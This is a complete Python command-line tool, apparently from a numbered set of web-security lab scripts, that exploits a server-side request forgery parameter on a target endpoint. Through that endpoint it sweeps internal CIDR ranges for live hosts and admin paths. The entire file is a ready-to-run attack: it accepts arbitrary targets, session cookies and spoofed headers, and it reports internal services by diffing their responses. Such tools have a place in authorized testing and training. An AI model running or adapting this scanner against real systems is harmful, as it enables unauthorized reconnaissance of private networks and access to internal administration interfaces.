#!/usr/bin/env python3
"""
SSRF - Internal Network Enumerator

Sweeps a CIDR block via a server-side request forgery parameter.
Identifies live internal hosts by diffing each response against a
dead-host baseline (status code + body length + optional keyword).

Works with any target: POST/GET, any parameter, any header/cookie config.
"""
import argparse
import ipaddress
import sys
import urllib.parse
import requests

DEAD_IP = "192.0.2.1"  # TEST-NET-1, RFC 5737 — guaranteed unreachable


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def build_headers(cookie: str | None, raw_headers: list[str]) -> dict:
    headers = {}
    if cookie:
        headers["Cookie"] = cookie
    for h in raw_headers:
        if ":" not in h:
            print(f"[!] Ignoring malformed header (expected 'Name: Value'): {h}")
            continue
        name, _, value = h.partition(":")
        headers[name.strip()] = value.strip()
    return headers


def send_request(
    method: str, target: str, param: str, ssrf_url: str,
    headers: dict, extra_data: dict, timeout: int,
) -> requests.Response:
    if method == "GET":
        params = {**extra_data, param: ssrf_url}
        return requests.get(target, params=params, headers=headers,
                            timeout=timeout, allow_redirects=False)
    else:
        data = {**extra_data, param: ssrf_url}
        return requests.post(target, data=data, headers=headers,
                             timeout=timeout, allow_redirects=False)


# ---------------------------------------------------------------------------
# Baseline
# ---------------------------------------------------------------------------

def get_baseline(
    method: str, target: str, param: str,
    port: int, path: str,
    headers: dict, extra_data: dict,
) -> dict:
    ssrf_url = f"http://{DEAD_IP}:{port}{path}"
    r = send_request(method, target, param, ssrf_url, headers, extra_data, timeout=10)
    return {"status": r.status_code, "length": len(r.text), "text": r.text}


# ---------------------------------------------------------------------------
# Sweep
# ---------------------------------------------------------------------------

def sweep(
    method: str, target: str, param: str,
    cidr: str, port: int, path: str,
    headers: dict, extra_data: dict,
    baseline: dict, keyword: str | None, verbose: bool,
) -> list[dict]:
    network  = ipaddress.ip_network(cidr, strict=False)
    hosts    = list(network.hosts())
    findings = []

    print(f"[*] Sweeping {len(hosts)} hosts in {cidr}")
    print(f"[*] Baseline : HTTP {baseline['status']}  len={baseline['length']}\n")

    for ip in hosts:
        ssrf_url = f"http://{ip}:{port}{path}"
        try:
            r = send_request(method, target, param, ssrf_url, headers, extra_data, timeout=8)
        except requests.RequestException as e:
            if verbose:
                print(f"  [-] {ip}  error: {e}")
            continue

        status_diff = r.status_code != baseline["status"]
        length_diff = abs(len(r.text) - baseline["length"]) > 50
        keyword_hit = keyword and keyword.lower() in r.text.lower()
        interesting = status_diff or length_diff or keyword_hit

        if interesting or verbose:
            tag = "[+]" if interesting else "   "
            line = f"  {tag} {ip}:{port}{path}  HTTP {r.status_code}  len={len(r.text)}"
            if keyword_hit:
                line += f"  keyword='{keyword}'"
            print(line)

        if interesting:
            findings.append({
                "ip":      str(ip),
                "url":     ssrf_url,
                "status":  r.status_code,
                "length":  len(r.text),
                "snippet": r.text[:500],
                "keyword": keyword_hit,
            })

    return findings


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="SSRF internal-network enumerator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  # POST param, 192.168.0.0/24, port 8080, path /admin
  python3 scripts/11_ssrf.py \\
    --target https://example.com/product/stock \\
    --param stockApi \\
    --cookie "session=abc123" \\
    --cidr 192.168.0.0/24 --port 8080 --path /admin

  # GET param, custom header, flag keyword
  python3 scripts/11_ssrf.py \\
    --target https://example.com/fetch \\
    --param url --method GET \\
    --header "X-API-Key: secret" \\
    --cidr 10.0.0.0/24 --port 80 --path / \\
    --keyword "Internal"

  # Extra body params alongside the SSRF param
  python3 scripts/11_ssrf.py \\
    --target https://example.com/api \\
    --param fetch_url \\
    --data "format=json" --data "version=2" \\
    --cidr 172.16.0.0/24 --port 443 --path /api/admin
""",
    )
    parser.add_argument("--target", required=True,
                        help="Full URL of the vulnerable endpoint, e.g. https://example.com/product/stock")
    parser.add_argument("--param", required=True,
                        help="Parameter name that triggers the SSRF")
    parser.add_argument("--method", choices=["GET", "POST"], default="POST",
                        help="HTTP method (default: POST)")
    parser.add_argument("--cookie",
                        help="Full Cookie header value, e.g. 'session=abc; auth=xyz'")
    parser.add_argument("--header", action="append", default=[], metavar="NAME:VALUE",
                        help="Extra request header (repeatable), e.g. --header 'X-Forwarded-For: 127.0.0.1'")
    parser.add_argument("--data", action="append", default=[], metavar="KEY=VALUE",
                        help="Extra body/query param to include alongside the SSRF param (repeatable)")
    parser.add_argument("--cidr", default="192.168.0.0/24",
                        help="CIDR block to enumerate (default: 192.168.0.0/24)")
    parser.add_argument("--port", type=int, default=8080,
                        help="Port to probe on each internal host (default: 8080)")
    parser.add_argument("--path", default="/admin",
                        help="Path to request on each internal host (default: /admin)")
    parser.add_argument("--keyword",
                        help="Flag responses containing this string (case-insensitive)")
    parser.add_argument("--verbose", action="store_true",
                        help="Print every host, not just interesting ones")
    args = parser.parse_args()

    # Parse --data KEY=VALUE pairs
    extra_data = {}
    for pair in args.data:
        if "=" not in pair:
            print(f"[!] Ignoring malformed --data value (expected KEY=VALUE): {pair}")
            continue
        k, _, v = pair.partition("=")
        extra_data[k] = v

    headers  = build_headers(args.cookie, args.header)

    print(f"[*] Target   : {args.target}")
    print(f"[*] Method   : {args.method}  param={args.param}")
    print(f"[*] SSRF URL : http://<ip>:{args.port}{args.path}")
    print(f"[*] Getting baseline (dead host: {DEAD_IP})...")

    baseline = get_baseline(args.method, args.target, args.param,
                            args.port, args.path, headers, extra_data)

    findings = sweep(args.method, args.target, args.param,
                     args.cidr, args.port, args.path,
                     headers, extra_data,
                     baseline, args.keyword, args.verbose)

    print(f"\n[*] Sweep complete. {len(findings)} interesting host(s) found.")
    if findings:
        print("\n[+] Findings:")
        for f in findings:
            print(f"    {f['url']}  HTTP {f['status']}  len={f['length']}")
            if f["snippet"].strip():
                print(f"    └─ {f['snippet'][:120].strip()}")
    else:
        print("[-] No live hosts detected. Try --verbose to see all responses, or adjust --keyword.")
        sys.exit(1)


if __name__ == "__main__":
    main()
